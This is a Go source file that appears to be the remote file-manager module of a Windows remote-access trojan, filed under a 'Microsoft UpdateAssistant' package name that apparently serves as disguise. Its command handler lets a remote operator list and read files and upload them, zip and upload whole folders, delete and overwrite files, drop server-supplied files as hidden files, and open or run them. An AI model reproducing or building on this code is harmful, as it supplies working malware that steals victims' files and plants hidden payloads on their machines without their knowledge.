//go:build windows

package fileexplorer

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/files"
	"github.com/microsoft/UpdateAssistant/modules/loader"
	"github.com/microsoft/UpdateAssistant/modules/sysutil"
	"github.com/microsoft/UpdateAssistant/modules/transport"
)

var (
	mu          sync.Mutex
	p           *loader.Plugin
	watchMu     sync.Mutex
	watchStop   chan struct{}
	watchPath   string
	watchHandle syscall.Handle
)

func open() bool {
	mu.Lock()
	defer mu.Unlock()
	if p != nil {
		return true
	}
	var err error
	p, err = loader.Load("fileutil")
	return err == nil
}

func unload() {
	mu.Lock()
	defer mu.Unlock()
	if p != nil {
		loader.Unload(p)
		p = nil
	}
}

func callStr(export, arg string) string {
	mu.Lock()
	defer mu.Unlock()
	if p == nil {
		return ""
	}
	buf := make([]byte, config.CmdBuf)
	n, err := p.Call(export,
		uintptr(unsafe.Pointer(loader.BytePtr(arg))),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(config.CmdBuf),
	)
	if err != nil {
		return ""
	}
	return string(buf[:int(n)])
}

func callBool(export string, args ...uintptr) bool {
	mu.Lock()
	defer mu.Unlock()
	if p == nil {
		return false
	}
	n, _ := p.Call(export, args...)
	return int(n) == 1
}

func callRead(path string) []byte {
	mu.Lock()
	defer mu.Unlock()
	if p == nil {
		return nil
	}
	buf := make([]byte, config.FileCap)
	n, err := p.Call("read_file",
		uintptr(unsafe.Pointer(loader.BytePtr(path))),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(config.FileCap),
	)
	if err != nil || int(n) == 0 {
		return nil
	}
	return buf[:int(n)]
}

func callSearch(root, pattern string, maxDepth int, hidden, content bool, maxFileKB int) string {
	mu.Lock()
	defer mu.Unlock()
	if p == nil {
		return ""
	}
	buf := make([]byte, config.CmdBuf)
	hiddenInt := uintptr(0)
	if hidden {
		hiddenInt = 1
	}
	contentInt := uintptr(0)
	if content {
		contentInt = 1
	}
	n, err := p.Call("search_files",
		uintptr(unsafe.Pointer(loader.BytePtr(root))),
		uintptr(unsafe.Pointer(loader.BytePtr(pattern))),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(config.CmdBuf),
		uintptr(maxDepth),
		hiddenInt,
		contentInt,
		uintptr(maxFileKB),
	)
	if err != nil {
		return ""
	}
	return string(buf[:int(n)])
}

func callTruncateFile(path string) bool {
	mu.Lock()
	defer mu.Unlock()
	if p == nil {
		return false
	}
	n, _ := p.Call("create_file", uintptr(unsafe.Pointer(loader.BytePtr(path))))
	return int(n) == 1
}

func callWriteFile(path string, data []byte) bool {
	mu.Lock()
	defer mu.Unlock()
	if p == nil || len(data) == 0 {
		return false
	}
	n, _ := p.Call("write_file",
		uintptr(unsafe.Pointer(loader.BytePtr(path))),
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
	)
	return int(n) == 1
}

func resolveConflict(path string) string {
	if !fileExists(path) {
		return path
	}
	ext := ""
	base := path
	if i := len(path) - 1; i >= 0 {
		for i >= 0 && path[i] != '.' && path[i] != '\\' {
			i--
		}
		if i >= 0 && path[i] == '.' {
			ext = path[i:]
			base = path[:i]
		}
	}
	for n := 1; n < 1000; n++ {
		candidate := fmt.Sprintf("%s (%d)%s", base, n, ext)
		if !fileExists(candidate) {
			return candidate
		}
	}
	return path
}

func fileExists(path string) bool {
	ptr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return false
	}
	attr, err := syscall.GetFileAttributes(ptr)
	return err == nil && attr != syscall.INVALID_FILE_ATTRIBUTES
}

func Open(client *transport.Client) {
	open()
}

func Close() {
	stopWatch()
	unload()
}

func stopWatch() {
	watchMu.Lock()
	defer watchMu.Unlock()
	if watchStop != nil {
		close(watchStop)
		watchStop = nil
		watchPath = ""
	}
	if watchHandle != 0 {
		syscall.CloseHandle(watchHandle)
		watchHandle = 0
	}
}

func startWatch(client *transport.Client, path string) {
	watchMu.Lock()
	defer watchMu.Unlock()
	if watchPath == path {
		return
	}
	if watchStop != nil {
		close(watchStop)
	}
	watchStop = make(chan struct{})
	watchPath = path
	stop := watchStop
	go watchDir(client, path, stop)
}

func watchDir(client *transport.Client, path string, stop chan struct{}) {
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	h, err := syscall.CreateFile(
		pathPtr,
		syscall.FILE_LIST_DIRECTORY,
		syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE|syscall.FILE_SHARE_DELETE,
		nil,
		syscall.OPEN_EXISTING,
		syscall.FILE_FLAG_BACKUP_SEMANTICS|syscall.FILE_FLAG_OVERLAPPED,
		0,
	)
	if err != nil {
		return
	}
	watchMu.Lock()
	watchHandle = h
	watchMu.Unlock()
	defer func() {
		watchMu.Lock()
		if watchHandle == h {
			watchHandle = 0
		}
		watchMu.Unlock()
		syscall.CloseHandle(h)
	}()

	buf := make([]byte, 4096)
	var bytesReturned uint32
	const notifyFilter = 0x1 | 0x2 | 0x4 | 0x8 | 0x10 // FILE_NOTIFY_CHANGE_*

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	readDirChanges := kernel32.NewProc("ReadDirectoryChangesW")

	var (
		timerMu sync.Mutex
		timer   *time.Timer
	)

	notify := func() {
		timerMu.Lock()
		defer timerMu.Unlock()
		if timer != nil {
			timer.Stop()
		}
		timer = time.AfterFunc(400*time.Millisecond, func() {
			select {
			case <-stop:
			default:
				client.Send("fs_changed", map[string]interface{}{"path": path})
			}
		})
	}

	defer func() {
		timerMu.Lock()
		if timer != nil {
			timer.Stop()
		}
		timerMu.Unlock()
	}()

	for {
		select {
		case <-stop:
			return
		default:
		}

		r, _, _ := readDirChanges.Call(
			uintptr(h),
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
			0,
			notifyFilter,
			uintptr(unsafe.Pointer(&bytesReturned)),
			0,
			0,
		)
		if r == 0 {
			return
		}

		notify()
	}
}

func Handle(client *transport.Client, msgType string, payload json.RawMessage) {
	switch msgType {
	case "fs_run":
		var p struct {
			Path string `json:"path"`
		}
		if json.Unmarshal(payload, &p) == nil && p.Path != "" {
			sysutil.OpenFile(p.Path)
		}
	case "fs_open":
		open()
	case "fs_close":
		unload()
	case "fs_list":
		var m struct {
			Path string `json:"path"`
		}
		if json.Unmarshal(payload, &m) != nil || m.Path == "" {
			return
		}
		result := callStr("list_dir", m.Path)
		client.Send("fs_list_result", map[string]interface{}{"path": m.Path, "entries": result})
		startWatch(client, m.Path)
	case "fs_read":
		var m struct {
			Path string `json:"path"`
		}
		if json.Unmarshal(payload, &m) != nil || m.Path == "" {
			return
		}
		data := callRead(m.Path)
		if len(data) == 0 {
			client.Send("fs_read_result", map[string]interface{}{"path": m.Path, "data": ""})
			return
		}
		id, err := files.Upload(filepath.Base(m.Path), data)
		if err != nil {
			client.Send("fs_read_result", map[string]interface{}{"path": m.Path, "data": "", "error": err.Error()})
			return
		}
		client.Send("fs_read_result", map[string]interface{}{"path": m.Path, "attachment": id})
	case "fs_download":
		var m struct {
			Path string `json:"path"`
		}
		if json.Unmarshal(payload, &m) != nil || m.Path == "" {
			return
		}
		go func() {
			data := callRead(m.Path)
			if len(data) == 0 {
				client.Send("fs_download_result", map[string]interface{}{"path": m.Path, "ok": false, "error": "read failed or empty"})
				return
			}
			id, err := files.Upload(filepath.Base(m.Path), data)
			if err != nil {
				client.Send("fs_download_result", map[string]interface{}{"path": m.Path, "ok": false, "error": err.Error()})
				return
			}
			client.Send("fs_download_result", map[string]interface{}{"path": m.Path, "ok": true, "id": id})
		}()
	case "fs_toggle_hidden":
		var m struct {
			Path string `json:"path"`
		}
		if json.Unmarshal(payload, &m) != nil || m.Path == "" {
			return
		}
		ok := callBool("toggle_hidden", uintptr(unsafe.Pointer(loader.BytePtr(m.Path))))
		client.Send("fs_op_result", map[string]interface{}{"op": "toggle_hidden", "path": m.Path, "ok": ok})
	case "fs_delete":
		var m struct {
			Paths []string `json:"paths"`
		}
		if json.Unmarshal(payload, &m) != nil || len(m.Paths) == 0 {
			return
		}
		failed := 0
		for _, p := range m.Paths {
			if !callBool("delete_file", uintptr(unsafe.Pointer(loader.BytePtr(p)))) {
				failed++
			}
		}
		client.Send("fs_op_result", map[string]interface{}{"op": "delete", "ok": failed == 0})
	case "fs_rename":
		var m struct {
			Old string `json:"old"`
			New string `json:"new"`
		}
		if json.Unmarshal(payload, &m) != nil || m.Old == "" || m.New == "" {
			return
		}
		ok := callBool("rename_file",
			uintptr(unsafe.Pointer(loader.BytePtr(m.Old))),
			uintptr(unsafe.Pointer(loader.BytePtr(m.New))),
		)
		client.Send("fs_op_result", map[string]interface{}{"op": "rename", "path": m.Old, "ok": ok})
	case "fs_copy":
		var m struct {
			Src string `json:"src"`
			Dst string `json:"dst"`
		}
		if json.Unmarshal(payload, &m) != nil || m.Src == "" || m.Dst == "" {
			return
		}
		ok := callBool("copy_file",
			uintptr(unsafe.Pointer(loader.BytePtr(m.Src))),
			uintptr(unsafe.Pointer(loader.BytePtr(m.Dst))),
		)
		client.Send("fs_op_result", map[string]interface{}{"op": "copy", "src": m.Src, "dst": m.Dst, "ok": ok})
	case "fs_create":
		var m struct {
			Path   string `json:"path"`
			Hidden bool   `json:"hidden"`
		}
		if json.Unmarshal(payload, &m) != nil || m.Path == "" {
			return
		}
		ok := callBool("create_file", uintptr(unsafe.Pointer(loader.BytePtr(m.Path))))
		if ok && m.Hidden {
			callBool("hide_path", uintptr(unsafe.Pointer(loader.BytePtr(m.Path))))
		}
		client.Send("fs_op_result", map[string]interface{}{"op": "create", "path": m.Path, "ok": ok})
	case "fs_mkdir":
		var m struct {
			Path   string `json:"path"`
			Hidden bool   `json:"hidden"`
		}
		if json.Unmarshal(payload, &m) != nil || m.Path == "" {
			return
		}
		ok := callBool("create_dir", uintptr(unsafe.Pointer(loader.BytePtr(m.Path))))
		if ok && m.Hidden {
			callBool("hide_path", uintptr(unsafe.Pointer(loader.BytePtr(m.Path))))
		}
		client.Send("fs_op_result", map[string]interface{}{"op": "mkdir", "path": m.Path, "ok": ok})
	case "fs_write":
		var m struct {
			Path    string `json:"path"`
			Content string `json:"content"`
		}
		if json.Unmarshal(payload, &m) != nil || m.Path == "" {
			return
		}
		var ok bool
		if len(m.Content) == 0 {
			ok = callTruncateFile(m.Path)
		} else {
			ok = callWriteFile(m.Path, []byte(m.Content))
		}
		client.Send("fs_op_result", map[string]interface{}{
			"ok":   ok,
			"op":   "write",
			"path": m.Path,
		})
	case "fs_search":
		var m struct {
			Path      string `json:"path"`
			Pattern   string `json:"pattern"`
			MaxDepth  int    `json:"max_depth"`
			Hidden    bool   `json:"hidden"`
			Content   bool   `json:"content"`
			MaxFileKB int    `json:"max_file_kb"`
		}
		if json.Unmarshal(payload, &m) != nil || m.Path == "" || m.Pattern == "" {
			return
		}
		go func() {
			result := callSearch(m.Path, m.Pattern, m.MaxDepth, m.Hidden, m.Content, m.MaxFileKB)
			client.Send("fs_search_result", map[string]interface{}{
				"path":    m.Path,
				"pattern": m.Pattern,
				"results": result,
			})
		}()
	case "fs_upload":
		var m struct {
			AttachmentID string   `json:"attachment_id"`
			DestPaths    []string `json:"dest_paths"`
			Overwrite    bool     `json:"overwrite"`
			Hidden       bool     `json:"hidden"`
		}
		if json.Unmarshal(payload, &m) != nil || m.AttachmentID == "" || len(m.DestPaths) == 0 {
			return
		}
		go func() {
			data, _, err := files.Download(m.AttachmentID)
			if err != nil {
				client.Send("fs_op_result", map[string]interface{}{"op": "upload", "ok": false, "error": err.Error()})
				return
			}
			for _, destPath := range m.DestPaths {
				dest := destPath
				if !m.Overwrite {
					dest = resolveConflict(dest)
				}
				ok := callWriteFile(dest, data)
				if ok && m.Hidden {
					callBool("hide_path", uintptr(unsafe.Pointer(loader.BytePtr(dest))))
				}
			}
			client.Send("fs_op_result", map[string]interface{}{"op": "upload", "ok": true})
		}()
	case "fs_download_multi":
		var m struct {
			Paths []string `json:"paths"`
		}
		if json.Unmarshal(payload, &m) != nil || len(m.Paths) == 0 {
			return
		}
		go func() {
			var buf bytes.Buffer
			zw := zip.NewWriter(&buf)
			added := 0
			skipped := 0
			for _, rootPath := range m.Paths {
				info, err := os.Stat(rootPath)
				if err != nil {
					skipped++
					continue
				}
				if !info.IsDir() {
					data := callRead(rootPath)
					if len(data) > 0 {
						if fw, err := zw.Create(filepath.Base(rootPath)); err == nil {
							fw.Write(data)
							added++
						}
					} else {
						skipped++
					}
					continue
				}
				listBuf := make([]byte, config.CmdBuf)
				n, err := p.Call("list_files_recursive",
					uintptr(unsafe.Pointer(loader.BytePtr(rootPath))),
					uintptr(unsafe.Pointer(&listBuf[0])),
					uintptr(config.CmdBuf),
				)
				if err != nil || int(n) == 0 {
					skipped++
					continue
				}
				fileList := strings.Split(string(listBuf[:int(n)]), "\n")
				baseName := filepath.Base(rootPath)
				for _, file := range fileList {
					file = strings.TrimSpace(file)
					if file == "" {
						continue
					}
					rel, err := filepath.Rel(rootPath, file)
					if err != nil {
						rel = filepath.Base(file)
					}
					zipPath := baseName + "/" + filepath.ToSlash(rel)
					data := callRead(file)
					if len(data) > 0 {
						if fw, err := zw.Create(zipPath); err == nil {
							fw.Write(data)
							added++
						}
					} else {
						skipped++
					}
				}
			}
			zw.Close()
			if buf.Len() == 0 {
				client.Send("fs_download_result", map[string]interface{}{"ok": false, "error": "no files read"})
				return
			}
			zipName := fmt.Sprintf("files_%s.zip", time.Now().Format("20060102_150405"))
			id, err := files.Upload(zipName, buf.Bytes())
			if err != nil {
				client.Send("fs_download_result", map[string]interface{}{"ok": false, "error": err.Error()})
				return
			}
			client.Send("fs_download_result", map[string]interface{}{
				"ok":      true,
				"id":      id,
				"path":    zipName,
				"added":   added,
				"skipped": skipped,
			})
		}()
	}
}
